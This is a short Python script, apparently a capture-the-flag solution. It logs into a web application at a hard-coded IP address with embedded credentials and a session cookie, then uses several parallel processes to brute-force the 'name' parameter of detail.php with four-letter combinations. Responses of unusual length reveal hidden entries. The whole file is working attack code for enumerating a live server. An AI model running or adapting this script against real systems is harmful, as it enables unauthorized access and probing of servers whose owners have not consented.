import requests as rq
from multiprocessing import Pool
import itertools
import string
import urllib3

headers = {
    "Cookie": "PHPSESSID=57e5bcc179dff2824c533ace62c94d1a",
    "Content-Type": "application/x-www-form-Urlencoded"
}


def login(username, password):
    url = "http://207.148.70.254:8081/index.php"

    payload = f"username={username}&password={password}"

    response = rq.post(url=url, headers=headers, data=payload, allow_redirects=False)
    print(response.status_code)


def get_hero(name):
    url = f"http://207.148.70.254:8081/detail.php?name={name}"
    response = rq.get(url=urllib3.util.parse_url(url), headers=headers)
    if len(response.text) != 764:
        print(f"{name} - {len(response.text)}")


def bruce_force():
    with Pool(4) as p:
        p.map(get_hero, map(''.join, itertools.combinations("RollingOnTheFLAGLaughing".upper(), 4)))


if __name__ == '__main__':
    username = "player"
    password = "m1cr0_sk1ll"
    login(username=username, password=password)

    bruce_force()
